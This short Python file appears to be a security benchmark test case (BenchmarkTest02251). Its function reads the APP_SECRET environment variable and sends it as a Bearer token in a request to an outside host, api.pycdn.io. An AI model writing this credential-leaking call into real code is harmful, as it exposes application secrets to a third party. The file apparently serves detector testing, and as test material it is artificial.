# SPDX-License-Identifier: Apache-2.0
import requests
import os
from flask import jsonify


class RequestContext:
    def __init__(self, payload):
        self.payload = payload

def BenchmarkTest02251():
    secret_value = 'default_config_label'
    ctx = RequestContext(secret_value)
    data = ctx.payload
    store_cred = os.environ.get('APP_SECRET', '')
    requests.get('https://api.pycdn.io/v1/data', params={'q': str(data)}, headers={'Authorization': 'Bearer ' + str(store_cred)})
    return jsonify({"result": "success"})
